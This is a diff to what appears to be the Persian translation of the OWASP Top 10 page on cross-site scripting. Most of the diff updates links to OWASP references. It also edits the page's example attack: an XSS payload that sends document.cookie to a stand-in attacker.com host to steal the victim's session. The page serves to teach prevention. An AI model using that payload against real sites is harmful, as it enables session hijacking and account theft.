@@ -36,7 +36,7 @@
   <li>فرار داده های درخواست HTTP نامعتبر براساس متن در خروجی HTML (بدنه، ویژگی، جاوا اسکریپت، CSS، یا URL ) آسیب پذیری های XSS ذخیره شده و منعکس شده را حل خواهد کرد.  
   </li>
   <li>
-    با استفاده از رمزگذاری حساس به متن هنگام تغییر سند مرورگر در سمت مشتری بر علیه DOM XSS عمل می‌کند. هنگامی‌که از انجام این کار اجتناب نکنیم، تکنیک های فرار از حساسیت متن مشابه می‌توانند به API های مرورگر اعمال شوند، همانطور که در<a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP Cheat Sheet 'XSS Prevention'</a> توضیح داده شده است. </li>
+    با استفاده از رمزگذاری حساس به متن هنگام تغییر سند مرورگر در سمت مشتری بر علیه DOM XSS عمل می‌کند. هنگامی‌که از انجام این کار اجتناب نکنیم، تکنیک های فرار از حساسیت متن مشابه می‌توانند به API های مرورگر اعمال شوند، همانطور که در<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet 'XSS Prevention'</a> توضیح داده شده است. </li>
   <li>
     فعال کردن یک سیاست امنیتی محتوا <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">(CSP)</a>  یک کنترل دفاع در عمق در برابر XSS  است. این مؤثر است اگر هیچ آسیب پذیری دیگری وجود نداشته باشد که اجازه می‌دهد کدهای مخرب را از طریق فایل محلی شامل شود (مثلا مسیرهای رونویسی شده یا کتابخانه های آسیب پذیر از شبکه های تحویل مجاز محتوا).
   </li>
@@ -49,7 +49,7 @@
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
 <p dir="rtl" align="right">مهاجم پارامتر CC را در مرورگر خود به صورت زیر تغییر می‌دهد :</p>
 
-`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
+`'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
 <p dir="rtl" align="right">این حمله باعث می‌شود شناسه نشست قربانی به وب سایت مهاجم ارسال شده و به مهاجم اجازه سرقت نشست فعلی کاربر را می‌دهد.</p>
 
@@ -59,16 +59,16 @@
 
 ### <div dir="rtl" align="right">OWASP</div>
 
-* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
-* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
-* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
-* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
-* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
-* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
-* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
+* [OWASP Proactive Controls: Encode Data](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [OWASP Proactive Controls: Validate Data](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [OWASP Application Security Verification Standard: V5](https://owasp.org/www-project-application-security-verification-standard/)
+* [OWASP Testing Guide: Testing for Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
+* [OWASP Testing Guide: Testing for Stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
+* [OWASP Testing Guide: Testing for DOM XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
+* [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+* [OWASP Cheat Sheet: DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+* [OWASP Cheat Sheet: XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+* [OWASP Java Encoder Project](https://owasp.org/www-project-java-encoder/)
 
 ### <div dir="rtl" align="right">خارجی</div>
 
